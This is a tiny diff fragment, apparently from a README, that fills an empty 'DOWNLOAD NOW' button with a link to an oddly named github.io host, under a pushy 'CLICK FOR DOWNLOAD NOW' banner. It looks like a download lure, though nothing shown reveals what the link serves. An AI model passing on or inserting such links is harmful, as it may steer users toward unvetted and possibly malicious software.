@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://dex-liquidiot-pcwinmac-ld39.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
